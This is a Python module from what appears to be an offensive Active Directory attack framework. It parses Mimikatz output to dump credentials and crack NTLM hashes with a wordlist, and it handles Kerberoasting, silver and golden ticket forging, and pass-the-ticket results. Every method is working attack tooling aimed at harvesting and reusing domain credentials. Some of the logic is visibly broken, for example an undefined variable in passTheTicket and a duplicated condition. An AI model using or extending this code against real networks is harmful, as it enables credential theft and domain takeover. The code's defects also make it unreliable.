from flask import current_app
import re
import hashlib
import binascii
import core.helper.pkcracker

powerkatzCracker = core.helper.pkcracker.PowerkatzCracker()

class MimikatzExecutor:
    def __init__(self):
        self.commandsAndResults = dict()
        self.commandsAndResultsId = 0
        self.currentUser = str()

    @staticmethod
    def getNtlmHash(clearTextPassword):
        ntlmHash = hashlib.new('md4', clearTextPassword.encode('utf-16le')).digest()
        hexNtlmHash = binascii.hexlify(ntlmHash).decode()

        return hexNtlmHash

    def setCommandsAndResults(self, command, result):
        self.commandsAndResultsId += 1
        self.commandsAndResults[self.commandsAndResultsId] = dict()
        self.commandsAndResults[self.commandsAndResultsId]['command'] = command
        self.commandsAndResults[self.commandsAndResultsId]['result'] = result

    def credentialDumpingGetUsername(self, commandResult):
        usernameMatch = re.search(r'User Name.*: (.*)', commandResult)
        username = usernameMatch.group(1).lower()
        ignoredUsername = [r'local service', r'dwm-\d+', r'umfd-\d+', r'\(null\)', r'defaultapppool', r'iusr']
        for pattern in ignoredUsername:
            if re.match(pattern, username):
                # username matches an ignored pattern, filter it out
                username = None
                break

        if username != None:
            return username

    def credentialDumping(self, decryptedResult):
        splitedResult = decryptedResult.split('\n\n')
        del splitedResult[:3]
        del splitedResult[-2:]

        executorResults = list()
        for commandResult in splitedResult:
            filteredUsername = self.credentialDumpingGetUsername(commandResult)
            if filteredUsername == None:
                continue
            isMachineAccount = True if filteredUsername.endswith('$') else False

            domainMatch = re.search(r'Domain.*: (.*)', commandResult)
            domain = domainMatch.group(1).lower()

            # find NTLM hash in msv authentication
            findMsvHashPattern = r'msv\s+:\s+.*\s+\*\s+Username\s+:\s+(.*)\s+\*\sDomain\s+:\s+(.*)\s+\*\s+NTLM\s+\:\s+(.*)'
            matchedMsvResult = re.search(findMsvHashPattern, commandResult)
            if matchedMsvResult:
                ntlm = matchedMsvResult.group(3)
            else:
                ntlm = ''

            findKerberosPattern = r'kerberos\s+:\s+\*\s+Username\s+:\s+(.*)\s+\*\s+Domain\s+:\s+(.*)\s+\*\s+Password\s+:\s+(.*)'
            matchedKerberosResult = re.search(findKerberosPattern, commandResult)
            if matchedKerberosResult:
                domain = matchedKerberosResult.group(2).lower()

            clearTextPassword = ''
            findClearTextPasswordPattern = r'\*\s+Password\s+:\s+(.*)'
            matchedPasswordResult = re.search(findClearTextPasswordPattern, commandResult)
            if matchedPasswordResult:
                password = matchedPasswordResult.group(1)
                if password != '(null)':
                    clearTextPassword = password

            executorResult = dict()
            executorResult['username'] = filteredUsername
            executorResult['isMachineAccount'] = isMachineAccount
            executorResult['domain'] = domain
            executorResult['ntlm'] = ntlm
            executorResult['clearTextPassword'] = clearTextPassword
            executorResults.append(executorResult)

        uniqueUsernames = set()
        uniqueExecutorResults = []

        for item in executorResults:
            username = item['username']
            if username not in uniqueUsernames:
                uniqueUsernames.add(username)
                uniqueExecutorResults.append(item)

        # crack the NTLM hash
        passwordWordlist = current_app.config['settings']['otherGeneralSettings']['passwordCrackingWordlist']
        accountsHash = dict()
        for result in uniqueExecutorResults:
            username = result['username']
            ntlm = result['ntlm']
            clearTextPassword = result['clearTextPassword']

            # no need to crack if the account has cleartext password or doesn't have NTLM hash
            noNtlmHash = True if not ntlm else False
            hasClearTextPassword = True if clearTextPassword else False
            if noNtlmHash or hasClearTextPassword:
                continue

            accountsHash[username] = {'ntlmHash': ntlm}

        powerkatzCracker.startPasswordCrackingThread(accountsHash, passwordWordlist)
        crackedResults, failedResults = powerkatzCracker.getCrackingResult()

        formattedResult = ''
        for result in uniqueExecutorResults:
            isCracked = False
            username = result['username']
            isMachineAccount = result['isMachineAccount']
            domain = result['domain']
            ntlm = result['ntlm']

            clearTextPassword = result['clearTextPassword']
            if crackedResults and username in crackedResults:
                clearTextPassword = crackedResults[username]['clearTextPassword']
                isCracked = True
            if failedResults and username in failedResults:
                clearTextPassword = '(No cleartext password and unable to crack the NTLM hash)'
            if not clearTextPassword:
                clearTextPassword = '(No cleartext password)'

            if not ntlm:
                ntlm = '(No NTLM password hash)'
            if isMachineAccount:
                isMachineAccount = 'Yes'
            else:
                isMachineAccount = 'No'

            if username not in current_app.config['settings']['executor']:
                current_app.config['settings']['executor'][username] = dict()

            current_app.config['settings']['executor'][username]['isMachineAccount'] = isMachineAccount
            current_app.config['settings']['executor'][username]['domain'] = domain
            current_app.config['settings']['executor'][username]['ntlm'] = ntlm
            current_app.config['settings']['executor'][username]['clearTextPassword'] = clearTextPassword
            current_app.config['settings']['executor'][username]['isCracked'] = isCracked

            if isCracked:
                formattedResult += f'''Username: {username}
    Domain: {domain}
    Cleartext password (The hash is cracked): {clearTextPassword}
    NTLM hash: {ntlm}

'''
            else:
                formattedResult += f'''Username: {username}
    Domain: {domain}
    Cleartext password: {clearTextPassword}
    NTLM hash: {ntlm}

'''
        formattedResult += 'Note: All outputs are stored in the settings.'
        return formattedResult

    def kerberoasting(self, decryptedResult):
        splitedResult = decryptedResult.strip().split('\n\n')

        selectedServicePrincipalNames = list()
        tickets = dict()
        # get the selected targets' base64 TGS ticket
        for result in splitedResult:
            selectedServicePrincipalNamePattern = r'^mimikatz\(powershell\)\s#\skerberos::ask\s/target:(.*)'
            selectedServicePrincipalNameMatch = re.search(selectedServicePrincipalNamePattern, result)

            if selectedServicePrincipalNameMatch:
                selectedServicePrincipalName = selectedServicePrincipalNameMatch.group(1)
                selectedServicePrincipalNames.append(selectedServicePrincipalName)
            
            base64StringPattern = r'\s+====================\s+'
            base64StringMatch = re.search(base64StringPattern, result)
            if base64StringMatch:
                base64TicketPattern = r'kirbi\s+====================\s+'
                base64Ticket = ''.join(re.split(base64TicketPattern, result)[1].strip('=').strip().split('\n'))

                servicePrincipalNamePattern = r'\s+Server Name\s+:\s(.*)@'
                servicePrincipalNameMatch = re.search(servicePrincipalNamePattern, result)
                servicePrincipalName = servicePrincipalNameMatch.group(1).strip()

                if servicePrincipalName in selectedServicePrincipalNames:
                    tickets[servicePrincipalName] = base64Ticket

        formattedResult = str()
        for servicePrincipalName in tickets:
            base64Ticket = tickets[servicePrincipalName]

            passwordWordlist = current_app.config['settings']['otherGeneralSettings']['passwordCrackingWordlist']
            powerkatzCracker.startKeberoastingCrackingThread(servicePrincipalName, base64Ticket, passwordWordlist)

            keberoastingCrackingResult = powerkatzCracker.getKerberoastingCrackingResult()
            crackingStatus = keberoastingCrackingResult[servicePrincipalName]['status']
            crackedPassword = keberoastingCrackingResult[servicePrincipalName]['crackedPassword']

            hexNtlmHash = str()
            if crackingStatus == 'Cracked':
                hexNtlmHash = MimikatzExecutor.getNtlmHash(crackedPassword)

            serviceAccountDomain = str()
            for domain in current_app.config['settings']['targetDomain']:
                if serviceAccountDomain:
                    break

                kerberoastableServiceAccounts = current_app.config['settings']['targetDomain'][domain]['kerberoastableServiceAccounts']
                for kerberoastableServiceAccount in kerberoastableServiceAccounts:
                    isMatchServicePrincipalName = False
                    for spn in kerberoastableServiceAccounts[kerberoastableServiceAccount]['servicePrincipalNames']:
                        if spn == servicePrincipalName:
                            isMatchServicePrincipalName = True
                            break

                    if isMatchServicePrincipalName:
                        serviceAccountDomain = domain
                        serviceAccountUsername = kerberoastableServiceAccount
                        break

            if serviceAccountUsername not in current_app.config['settings']['executor']:
                current_app.config['settings']['executor'][serviceAccountUsername] = dict()

            current_app.config['settings']['executor'][serviceAccountUsername]['domain'] = serviceAccountDomain

            if 'kerberoasting' not in current_app.config['settings']['executor'][serviceAccountUsername]:
                current_app.config['settings']['executor'][serviceAccountUsername]['kerberoasting'] = dict()
            if 'kerberoasting' not in current_app.config['settings']['executor'][serviceAccountUsername]:
                if serviceAccountUsername.endswith('$'):
                    current_app.config['settings']['executor'][serviceAccountUsername]['isMachineAccount'] = 'Yes'
                else:
                    current_app.config['settings']['executor'][serviceAccountUsername]['isMachineAccount'] = 'No'

            current_app.config['settings']['executor'][serviceAccountUsername]['kerberoasting']['status'] = crackingStatus
            current_app.config['settings']['executor'][serviceAccountUsername]['kerberoasting']['crackedPassword'] = crackedPassword
            current_app.config['settings']['executor'][serviceAccountUsername]['kerberoasting']['ntlmHash'] = hexNtlmHash
            current_app.config['settings']['executor'][serviceAccountUsername]['kerberoasting']['base64TgsTicket'] = base64Ticket

            service = servicePrincipalName.split('/')[0]
            if crackingStatus == 'Cracked':
                formattedResult += f'''Service account username: {serviceAccountUsername} (Service: {service})
    Cleartext password (The ticket is cracked): {crackedPassword}

'''
            elif crackingStatus == 'Failed':
                formattedResult += f'''Service account username: {serviceAccountUsername} (Service: {service})
    Cleartext password: (Failed to crack the ticket)

'''

        formattedResult += 'Note: All outputs are stored in the settings.'
        return formattedResult

    def silverTicketExport(self, decryptedResult):
        formattedResult = str()
        tickets = list()
        FAILED_MESSAGE = 'Unable to export the ticket(s)'

        splitedResult = decryptedResult.strip().split('\n\n')[3:]

        if 'Final Ticket Saved to file !' not in splitedResult:
            formattedResult = FAILED_MESSAGE
            return formattedResult

        CHUNK_SIZE = 4
        for i in range(0, len(splitedResult), CHUNK_SIZE):
            resultChunk = splitedResult[i:i+4]
            base64TicketResult = resultChunk[2]

            domainMatch = re.search(r'Domain\s+:\s(.*)\s\(', resultChunk[0])
            domain = domainMatch.group(1)

            serviceMatch = re.search(r'Service\s+:\s(.*)', resultChunk[0])
            service = serviceMatch.group(1)

            targetMatch = re.search(r'Target\s+:\s(.*)', resultChunk[0])
            target = targetMatch.group(1)

            # use ntlm hash to find which service account belongs to
            ntlmHashMatch = re.search(r'ServiceKey:\s([0-9a-f]+)\s\-', resultChunk[0])
            if not ntlmHashMatch:
                formattedResult = FAILED_MESSAGE
                return formattedResult

            ntlmHash = ntlmHashMatch.group(1)
            accountUsername = str()
            for username in current_app.config['settings']['executor']:
                if 'kerberoasting' in current_app.config['settings']['executor'][username]:
                    usernameNtlmHash = current_app.config['settings']['executor'][username]['kerberoasting']['ntlmHash']
                    if ntlmHash == usernameNtlmHash:
                        accountUsername = username
            if not accountUsername:
                formattedResult = FAILED_MESSAGE
                return formattedResult
            
            base64StringPattern = r'\s+====================\s+'
            base64StringMatch = re.search(base64StringPattern, base64TicketResult)
            if not base64StringMatch:
                formattedResult = FAILED_MESSAGE
                return formattedResult

            base64TicketPattern = r'kirbi\s+====================\s+'
            base64Ticket = ''.join(re.split(base64TicketPattern, base64TicketResult)[1].strip('=').strip().split('\n'))

            ticketInformation = dict()
            ticketInformation['service'] = service
            ticketInformation['target'] = target
            ticketInformation['username'] = accountUsername
            ticketInformation['base64TgsTicket'] = base64Ticket
            tickets.append(ticketInformation)

            current_app.config['settings']['executor'][accountUsername]['domain'] = domain

            if 'silverTicket' not in current_app.config['settings']['executor'][accountUsername]:
                current_app.config['settings']['executor'][accountUsername]['silverTicket'] = dict()
                current_app.config['settings']['executor'][accountUsername]['silverTicket']['tickets'] = list()

            current_app.config['settings']['executor'][accountUsername]['silverTicket']['tickets'].append(ticketInformation)

        for ticket in tickets:
            username = ticket['username']
            service = ticket['service']
            target = ticket['target']

            formattedResult += f'''Service account username: {username} (Service: {service})
    Target: {target}

'''

        formattedResult += 'Note: All outputs are stored in the settings.'
        return formattedResult

    def passTheTicket(self, decryptedResult):
        tickets = list()
        formattedResult = str()
        FAILED_MESSAGE = 'Unable to inject the ticket(s) into memory'

        splitedResult = decryptedResult.strip().split('\n\n')[3:]

        base64Tickets = list()
        ticketsInformation = list()
        for result in splitedResult:
            if '* File: ' in result:
                if ': OK' not in result:
                    formattedResult = FAILED_MESSAGE
                    return formattedResult, tickets

                base64TicketMatch = re.search(r'\* File: \'(.*)\': OK', result)
                if not base64TicketMatch:
                    formattedResult = FAILED_MESSAGE
                    return formattedResult, tickets

                base64Ticket = base64TicketMatch.group(1)
                base64Tickets.append(base64Ticket)

            if '[' in result:
                serverNameMatch = re.search(r'Server\sName\s+:\s(.*)\s@', result)
                if not serverNameMatch:
                    formattedResult = FAILED_MESSAGE
                    return formattedResult, tickets

                serverName = serverNameMatch.group(1)
                service, target = serverName.split('/')

                clientNameMatch = re.search(r'Client\sName\s+:\s(.*)\s@\s(.*)', result)
                if not clientNameMatch:
                    formattedResult = FAILED_MESSAGE
                    return formattedResult, tickets

                username = clientNameMatch.group(1)
                domain = clientNameMatch.group(2)

                ticketsInformation.append({
                        'username': username,
                        'service': service,
                        'target': target,
                        'domain': domain
                    })

        if not base64Tickets or not ticketsInformation:
            formattedResult = FAILED_MESSAGE
            return formattedResult, tickets

        base64TicketsLength = len(base64Tickets)
        ticketsInformationLength = len(ticketsInformation)
        # after silver ticket pass-the-ticket, the length of the base64 tickets 
        # and tickets information will be different
        if base64TicketsLength != ticketsInformationLength:
            for i, ticketInformation in enumerate(ticketsInformation):
                if (i + 1) > base64TicketsLength:
                    break

                tickets.append({
                        'service': ticketInformation['service'],
                        'target': ticketInformation['target'],
                        'username': ticketInformation['username'],
                        'domain': ticketInformation['domain'],
                        'base64TgsTicket': base64Tickets[i]
                    })
        else:
            for i, ticketInformation in enumerate(ticketsInformation):
                tickets.append({
                        'service': ticketInformation['service'],
                        'target': ticketInformation['target'],
                        'username': ticketInformation['username'],
                        'domain': ticketInformation['domain'],
                        'base64TgsTicket': base64Tickets[i]
                    })

        for ticket in tickets:
            username = ticket['username']
            service = ticket['service']
            target = ticket['target']
            domain = ticket.pop('domain')

            if username not in current_app.config['settings']['executor']:
                current_app.config['settings']['executor'][accountUsername] = dict()
                if accountUsername.endswith('$'):
                    current_app.config['settings']['executor'][accountUsername]['isMachineAccount'] = 'Yes'
                else:
                    current_app.config['settings']['executor'][accountUsername]['isMachineAccount'] = 'No'

                current_app.config['settings']['executor'][accountUsername]['domain'] = domain

                current_app.config['settings']['executor'][accountUsername]['tickets'] = list()
                current_app.config['settings']['executor'][accountUsername]['tickets'].append(ticket)

            formattedResult += f'''Service account username: {username} (Service: {service})
    Target: {target}

'''

        formattedResult += 'Note: All outputs are stored in the settings.'
        return formattedResult, tickets

    def goldenTicketExport(self, decryptedResult):
        ticket = dict()
        formattedResult = str()
        FAILED_MESSAGE = 'Unable to export the ticket'

        splitedResult = decryptedResult.strip().split('\n\n')[3:]
        isSuccessful = True if splitedResult[-1] == 'Final Ticket Saved to file !' else False
        if not isSuccessful:
            formattedResult = FAILED_MESSAGE
            return formattedResult

        commandResult = splitedResult[0]

        resultMatch = re.search(r'User\s+:\s(.*)\s+Domain\s+:\s(.*)\s\(.*\s+SID\s+:\s.*\s+User\sId\s+:\s.*\s+Groups\sId\s+:\s.*\s+ServiceKey:\s(.*)\s-', commandResult)
        if not resultMatch:
            formattedResult = FAILED_MESSAGE
            return formattedResult

        username = resultMatch.group(1)
        domain = resultMatch.group(2)
        ntlmHash = resultMatch.group(3)

        base64TicketResult = splitedResult[2]
        base64StringPattern = r'\s+====================\s+'
        base64StringMatch = re.search(base64StringPattern, base64TicketResult)
        if not base64StringMatch:
            formattedResult = FAILED_MESSAGE
            return formattedResult

        base64TicketPattern = r'kirbi\s+====================\s+'
        base64Ticket = ''.join(re.split(base64TicketPattern, base64TicketResult)[1].strip('=').strip().split('\n'))

        ticket['username'] = username
        ticket['domain'] = domain
        ticket['ntlmHash'] = ntlmHash
        ticket['base64TgsTicket'] = base64Ticket

        if username not in current_app.config['settings']['executor']:
            current_app.config['settings']['executor'][username] = dict()
            current_app.config['settings']['executor'][username]['domain'] = domain

        if 'goldenTicket' not in current_app.config['settings']['executor'][username]:
            current_app.config['settings']['executor'][username]['goldenTicket'] = dict()
            current_app.config['settings']['executor'][username]['goldenTicket']['tickets'] = list()

        current_app.config['settings']['executor'][username]['goldenTicket']['tickets'].append(ticket)


        formattedResult += f'''Forged Golden Ticket Username: {username}
    Domain: {domain}
    NTLM Hash: {ntlmHash}

'''

        formattedResult += 'Note: All outputs are stored in the settings.'
        return formattedResult